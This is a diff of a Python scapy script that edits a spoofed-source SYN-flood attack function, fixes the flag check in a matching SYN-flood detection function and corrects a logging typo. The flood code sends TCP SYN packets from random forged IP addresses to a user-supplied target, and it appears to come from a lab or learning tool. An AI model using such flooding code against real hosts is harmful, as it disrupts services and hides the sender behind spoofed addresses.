@@ -1,4 +1,3 @@
-
 # Author: Anthony Brunetti
 import os
 from scapy.all import *
@@ -107,13 +106,17 @@ def attack_syn_flood(IP,number):
 	
 		s_port = randInt()
 	
+		dstPort = randInt()
+
 		s_eq = randInt()
 	
 		w_indow = randInt()
 
-		ans,unans = srloop(IP(src = randomIP(),dst=IP)/
-			TCP(sport=s_port ,dport=dstPort,seq = s_eq, window = w_indow, flags="S"),
-			count=number)
+		print(randomIP())
+		
+		srloop(IP(src = randomIP(),dst=IP)/TCP(sport=s_port ,dport=dstPort,seq = s_eq, window = w_indow, flags="S"),count=number)
+
+		ans=""
 
 	return ans
 	
@@ -213,7 +216,7 @@ def dection_syn_flood():
 	
 	for pkt in  pkts:
 		
-		if TCP in pkt and pkt[TCP].flags == 'A':  # TCP SYN packet
+		if TCP in pkt and pkt[TCP].flags == 'S':  # TCP SYN packet
 	
 			src = pkt.sprintf('{IP:%IP.src%}{IPv4:%IPv4.src%}')
 	
@@ -282,7 +285,7 @@ def main():
 
 				number = int(input('numbers of attacks'))
 
-				loggin.info(attack_syn_flood(ip,number))
+				logging.info(attack_syn_flood(ip,number))
 
 			elif (choose == 4):	
 					
